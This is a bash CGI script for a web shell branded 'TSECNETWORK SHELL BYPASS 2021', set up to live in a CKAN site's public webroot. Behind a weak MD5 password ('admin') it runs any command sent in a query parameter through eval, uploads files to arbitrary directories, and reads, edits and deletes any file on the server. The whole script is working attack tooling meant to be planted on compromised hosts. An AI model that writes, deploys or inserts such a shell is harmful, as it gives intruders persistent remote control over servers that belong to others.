#!/bin/bash


# Konfigurasi
PASSWORD_HASH="21232f297a57a5a743894a0e4a801fc3" # admin
SESSION_TIMEOUT=3600

# Default webroot CKAN public
DEFAULT_PATH="/usr/lib/ckan/ckan/src/ckan/ckan/public"

# Function to URL decode
urldecode() {
    echo -e "$(sed 's/+/ /g;s/%\(..\)/\\x\1/g;s/&.*//')"
}

# Generate session
gen_session() {
    echo "$(date +%s)-$RANDOM-$RANDOM" | md5sum | cut -d' ' -f1
}

# Check auth
check_auth() {
    if echo "$HTTP_COOKIE" | grep -q "china_session="; then
        SESSION_ID=$(echo "$HTTP_COOKIE" | sed 's/.*china_session=\([^;]*\).*/\1/')
        if [ -f "/tmp/china_$SESSION_ID" ]; then
            SESSION_TIME=$(cat "/tmp/china_$SESSION_ID")
            CURRENT_TIME=$(date +%s)
            if [ $((CURRENT_TIME - SESSION_TIME)) -lt $SESSION_TIMEOUT ]; then
                return 0
            fi
        fi
    fi
    return 1
}

# Parse
QUERY_STRING="${QUERY_STRING:-$QUERY_STRING}"
ACTION=$(echo "$QUERY_STRING" | grep -oP 'action=\K[^&]*')
FILE_PATH=$(echo "$QUERY_STRING" | grep -oP 'path=\K[^&]*' | urldecode)
CMD=$(echo "$QUERY_STRING" | grep -oP 'cmd=\K[^&]*' | urldecode)
CURRENT_DIR="${FILE_PATH:-$DEFAULT_PATH}"

# Handle login
if [ "$ACTION" = "login" ]; then
    read POST_DATA
    PASSWORD=$(echo "$POST_DATA" | grep -oP 'password=\K[^&]*' | sed 's/%20/ /g')
    PASSWORD_MD5=$(echo -n "$PASSWORD" | md5sum | cut -d' ' -f1)
    if [ "$PASSWORD_MD5" = "$PASSWORD_HASH" ]; then
        SESSION_ID=$(gen_session)
        echo "$(date +%s)" > "/tmp/china_$SESSION_ID"
        echo "Content-Type: text/html"
        echo "Set-Cookie: china_session=$SESSION_ID; path=/; HttpOnly"
        echo ""
        echo "<meta http-equiv='refresh' content='0; url=?'>"
        exit 0
    else
        echo "Content-Type: text/html"
        echo ""
        cat << LOGINFAIL
<html><head><title>访问被拒绝</title></head>
<body bgcolor="#000000" text="#ff0000">
<center><h1>❌ 密码错误! Access Denied!</h1>
<a href="?action=logout">返回 Back</a></center>
</body></html>
LOGINFAIL
        exit 0
    fi
fi

# Handle logout
if [ "$ACTION" = "logout" ]; then
    echo "Content-Type: text/html"
    echo "Set-Cookie: china_session=; expires=Thu, 01 Jan 1970 00:00:00 GMT"
    echo "<meta http-equiv='refresh' content='0; url=?'>"
    exit 0
fi

# Handle terminal command
if [ "$ACTION" = "terminal" ] && [ -n "$CMD" ] && check_auth; then
    echo "Content-Type: text/plain"
    echo ""
    echo "┌─────────────────────────────────────────────────────────────┐"
    echo "│ 命令: $CMD                                                  │"
    echo "├─────────────────────────────────────────────────────────────┤"
    echo ""
    eval "$CMD" 2>&1
    echo ""
    echo "└─────────────────────────────────────────────────────────────┘"
    exit 0
fi

# Handle file upload
if [ "$ACTION" = "upload" ] && [ -n "$CONTENT_LENGTH" ] && check_auth; then
    BOUNDARY=$(echo "$CONTENT_TYPE" | grep -oP 'boundary=\K[^;]*')
    TEMP_FILE="/tmp/upload_$RANDOM.tmp"
    cat > $TEMP_FILE
    FILENAME=$(grep -oP 'filename="\K[^"]+' $TEMP_FILE | head -1)
    if [ -n "$FILENAME" ]; then
        sed -n "/Content-Type:/,\$p" $TEMP_FILE | tail -n +2 | sed '$d' | head -n -1 > "$CURRENT_DIR/$FILENAME"
        echo "Content-Type: text/html"
        echo ""
        echo "<html><head><meta http-equiv='refresh' content='1; url=?path=$CURRENT_DIR'></head>"
        echo "<body bgcolor='#000000'><center><font color='#00ff00'>✅ 上传成功! $FILENAME</font></center></body></html>"
    fi
    rm -f $TEMP_FILE
    exit 0
fi

# Handle delete
if [ "$ACTION" = "delete" ] && [ -n "$FILE_PATH" ] && check_auth; then
    rm -f "$FILE_PATH" 2>/dev/null
    echo "Content-Type: text/html"
    echo "<meta http-equiv='refresh' content='0; url=?path=$(dirname "$FILE_PATH")'>"
    exit 0
fi

# Handle edit save
if [ "$ACTION" = "save" ] && [ -n "$FILE_PATH" ] && check_auth; then
    CONTENT=$(cat)
    echo "$CONTENT" > "$FILE_PATH"
    echo "Content-Type: text/html"
    echo "<meta http-equiv='refresh' content='0; url=?action=edit&path=$FILE_PATH'>"
    exit 0
fi

# Handle edit form
if [ "$ACTION" = "edit" ] && [ -n "$FILE_PATH" ] && check_auth; then
    echo "Content-Type: text/html"
    echo ""
    cat << EDITFORM
<html>
<head>
<title>中国黑客编辑 | Edit</title>
<meta charset="UTF-8">
<style>
body { background: #000000; color: #00ff00; font-family: 'Courier New', monospace; }
.container { width: 90%; margin: 20px auto; }
.header { background: #330000; border: 2px solid #ff0000; padding: 10px; text-align: center; }
textarea { width: 100%; height: 400px; background: #001100; color: #00ff00; border: 2px solid #ff0000; font-family: monospace; padding: 10px; }
button { background: #330000; color: #ff0000; border: 1px solid #ff0000; padding: 10px 20px; cursor: pointer; margin: 10px; }
button:hover { background: #ff0000; color: #000000; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h2>📝 编辑文件 | EDIT FILE</h2>
<h3>🔴 $FILE_PATH</h3>
</div>
<form method="POST" action="?action=save&path=$FILE_PATH">
<textarea name="content">$(cat "$FILE_PATH" 2>/dev/null)</textarea><br>
<center>
<button type="submit">💾 保存保存 SAVE</button>
<button type="button" onclick="window.location.href='?path=$(dirname "$FILE_PATH")'">⬅ 返回 BACK</button>
</center>
</form>
</div>
</body>
</html>
EDITFORM
    exit 0
fi

if ! check_auth; then
    echo "Content-Type: text/html"
    echo ""
    cat << LOGINPAGE
<html>
<head>
<title>THC - File Manager</title>
<meta charset="UTF-8">
<style>
body {
    background: #000000;
    margin: 0;
    padding: 0;
    font-family: 'Courier New', monospace;
}
.login-container {
    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><text x="10" y="20" fill="red" font-size="12">黑</text><text x="30" y="40" fill="red" font-size="14">客</text><text x="50" y="60" fill="red" font-size="12">入</text><text x="70" y="80" fill="red" font-size="14">侵</text></svg>');
    border: 3px solid #ff0000;
    width: 500px;
    margin: 100px auto;
    padding: 30px;
    text-align: center;
    box-shadow: 0 0 50px rgba(255,0,0,0.3);
}
h1 {
    color: #ff0000;
    font-size: 28px;
    letter-spacing: 5px;
    text-shadow: 0 0 10px #ff0000;
    border-bottom: 1px dashed #ff0000;
    display: inline-block;
    padding-bottom: 10px;
}
h2 {
    color: #ff6600;
    font-size: 14px;
    margin-top: 20px;
}
.dragon {
    font-size: 40px;
    margin: 20px;
    animation: pulse 1s infinite;
}
@keyframes pulse {
    0% { opacity: 0.5; text-shadow: 0 0 0px red; }
    100% { opacity: 1; text-shadow: 0 0 20px red; }
}
input {
    background: #001100;
    border: 2px solid #ff0000;
    color: #00ff00;
    padding: 12px 20px;
    width: 80%;
    margin: 15px 0;
    font-family: monospace;
    font-size: 16px;
    text-align: center;
}
button {
    background: #330000;
    border: 2px solid #ff0000;
    color: #ff0000;
    padding: 12px 30px;
    font-size: 18px;
    cursor: pointer;
    font-family: monospace;
    font-weight: bold;
}
button:hover {
    background: #ff0000;
    color: #000000;
}
.footer {
    margin-top: 30px;
    color: #ff000088;
    font-size: 11px;
}
.blink {
    animation: blink 1s step-end infinite;
}
@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
}
</style>
</head>
<body>
<div class="login-container">
<div class="dragon">🐉 🔴 🐉</div>
<h1>⚡ 中国黑客 ⚡</h1>
<h2>TSECNETWORK SHELL BYPASS 2021</h2>
<hr style="border-color:#ff0000; width:80%">
<form method="POST" action="?action=login">
<input type="password" name="password" placeholder="🔐 ENTER PASSWORD" autofocus><br>
<button type="submit">⛩️ 入侵 BYPASS ⛩️</button>
</form>
<div class="footer">
<span class="blink">▶ LIVE ACCESS ◀</span>
© TSECNetwork Team 2021
</div>
</div>
</body>
</html>
LOGINPAGE
    exit 0
fi



echo "Content-Type: text/html"
echo ""

cat << MAINHTML
<html>
<head>
<title>THC - File Manager</title>
<meta charset="UTF-8">
<style>
body {
    background: #000000;
    color: #00ff00;
    font-family: 'Courier New', 'Terminal', monospace;
    margin: 0;
    padding: 10px;
}
.ascii-art {
    color: #ff0000;
    font-size: 10px;
    line-height: 1;
    white-space: pre;
    text-align: center;
    margin-bottom: 10px;
}
.header {
    background: #110000;
    border: 1px solid #ff0000;
    padding: 10px;
    margin-bottom: 15px;
}
.header h1 {
    color: #ff0000;
    margin: 0;
    font-size: 18px;
    display: inline-block;
}
.header span {
    color: #ff6600;
    font-size: 12px;
    margin-left: 20px;
}
.stats {
    float: right;
    color: #00ff00;
    font-size: 11px;
}
.nav {
    background: #001100;
    border-left: 4px solid #ff0000;
    padding: 8px;
    margin-bottom: 15px;
}
.nav a {
    color: #00ff00;
    text-decoration: none;
    margin-right: 15px;
    font-size: 12px;
}
.nav a:hover {
    color: #ff0000;
    text-decoration: underline;
}
.terminal-box {
    background: #000000;
    border: 2px solid #ff0000;
    margin-bottom: 15px;
    padding: 10px;
}
.terminal-box h3 {
    color: #ff6600;
    margin: 0 0 8px 0;
    font-size: 12px;
}
.terminal-input {
    display: flex;
    gap: 8px;
}
.terminal-input input {
    flex: 1;
    background: #001100;
    border: 1px solid #ff0000;
    color: #00ff00;
    padding: 6px;
    font-family: monospace;
}
.terminal-input button {
    background: #330000;
    border: 1px solid #ff0000;
    color: #ff0000;
    padding: 6px 12px;
    cursor: pointer;
}
.terminal-output {
    background: #001100;
    border: 1px solid #ff000033;
    padding: 8px;
    margin-top: 8px;
    max-height: 200px;
    overflow: auto;
    font-size: 11px;
}
.upload-box {
    background: #001100;
    border: 1px solid #ff0000;
    padding: 10px;
    margin-bottom: 15px;
}
.file-table {
    background: #000000;
    border: 1px solid #ff0000;
    width: 100%;
    border-collapse: collapse;
}
.file-table th {
    background: #330000;
    color: #ff0000;
    padding: 6px;
    text-align: left;
    font-size: 11px;
    border-bottom: 1px solid #ff0000;
}
.file-table td {
    padding: 5px 6px;
    font-size: 11px;
    border-bottom: 1px solid #330000;
}
.file-table tr:hover {
    background: #110000;
}
.dir-link {
    color: #ff6600;
    text-decoration: none;
}
.file-link {
    color: #00ff00;
    text-decoration: none;
}
.actions a {
    color: #ffaa00;
    text-decoration: none;
    margin-right: 8px;
    font-size: 10px;
}
.delete {
    color: #ff4444 !important;
}
.footer {
    margin-top: 15px;
    text-align: center;
    border-top: 1px solid #ff0000;
    padding-top: 8px;
    font-size: 9px;
    color: #ff000066;
}
</style>
<script>
function runCmd() {
    var cmd = document.getElementById('cmd_input').value;
    if (cmd) {
        var output = document.getElementById('cmd_output');
        output.innerHTML = '<font color="#ff6600">执行中...</font>';
        fetch('?action=terminal&cmd=' + encodeURIComponent(cmd))
            .then(res => res.text())
            .then(data => { output.innerHTML = '<pre>' + data + '</pre>'; });
    }
}
</script>
</head>
<body>

<div class="ascii-art">
    ╔══════════════════════════════════════════════════════════════╗

    ║                中国黑客入侵者   | 2021                        ║
    ╚══════════════════════════════════════════════════════════════╝
</div>

<div class="header">
    <h1>🐉 中国黑客文件管理器 | TSECNETWORK SHELL</h1>
    <span>BYPASS 2021 - ROOT ACCESS</span>
    <div class="stats">🔐 登录用户: root | 🖥️ $(hostname)</div>
</div>

<div class="nav">
    <a href="?">🏠 首页 HOME</a>
    <a href="?path=$CURRENT_DIR">🔄 刷新 REFRESH</a>
    <a href="?action=logout">🚪 退出 LOGOUT</a>
    <span style="color:#ff6600; margin-left:20px;">📂 当前目录: $CURRENT_DIR</span>
</div>

<div class="terminal-box">
    <h3>🐉 中国黑客终端 | COMMAND EXECUTOR</h3>
    <div class="terminal-input">
        <input type="text" id="cmd_input" placeholder="输入命令 | command..." onkeypress="if(event.keyCode==13) runCmd()">
        <button onclick="runCmd()">⚡ 执行 EXECUTE ⚡</button>
    </div>
    <div id="cmd_output" class="terminal-output">
        <pre>┌────────────────────────────────────────┐
│ 等待命令 | Waiting for command...      │
│ 输入执行后显示结果                      │
└────────────────────────────────────────┘</pre>
    </div>
</div>

<div class="upload-box">
    <form method="POST" enctype="multipart/form-data" action="?action=upload&amp;path=$CURRENT_DIR">
        📤 上传文件 UPLOAD: <input type="file" name="file">
        <button type="submit" style="background:#330000;border:1px solid red;color:red;">上传 UPLOAD</button>
    </form>
</div>

<table class="file-table">
    <thead>
        <tr>
            <th>📁 文件名 NAME</th>
            <th>📦 大小 SIZE</th>
            <th>🔐 权限 PERM</th>
            <th>⚙️ 操作 ACTIONS</th>
        </tr>
    </thead>
    <tbody>
MAINHTML

cd "$CURRENT_DIR" 2>/dev/null

# Parent directory
if [ "$CURRENT_DIR" != "/" ] && [ "$CURRENT_DIR" != "$DEFAULT_PATH" ]; then
    echo "<tr><td><a href='?path=$(dirname "$CURRENT_DIR")' class='dir-link'>📁 ..</a></td><td>&lt;DIR&gt;</td><td>-</td><td>-</td></tr>"
fi

for item in *; do
    if [ -e "$item" ]; then
        if [ -d "$item" ]; then
            echo "<tr><td><a href='?path=$CURRENT_DIR/$item' class='dir-link'>📁 $item</a></td><td>&lt;DIR&gt;</td><td>$(stat -c %a "$item" 2>/dev/null)</td><td>-</td></tr>"
        else
            size=$(stat -c %s "$item" 2>/dev/null)
            if [ "$size" -lt 1024 ]; then
                size_txt="${size} B"
            elif [ "$size" -lt 1048576 ]; then
                size_txt="$((size / 1024)) KB"
            else
                size_txt="$((size / 1048576)) MB"
            fi
            echo "<tr><td><a href='#' class='file-link'>📄 $item</a></td><td>$size_txt</td><td>$(stat -c %a "$item" 2>/dev/null)</td>"
            echo "<td class='actions'><a href='?action=edit&path=$CURRENT_DIR/$item'>✏️ 编辑</a>"
            echo "<a href='?action=delete&path=$CURRENT_DIR/$item' class='delete' onclick='return confirm(\"删除 $item ?\")'>🗑️ 删除</a></td></tr>"
        fi
    fi
done

cat << MAINHTML
    </tbody>
</table>

<div class="footer">
    <span>🐉 中国黑客 TSECNETWORK | SHELL BYPASS 2021 | ALL CONNECTIONS LOGGED 🐉</span><br>
    ⚡ 未经授权禁止访问 | Unauthorized Access Prohibited ⚡
</div>

</body>
</html>
MAINHTML
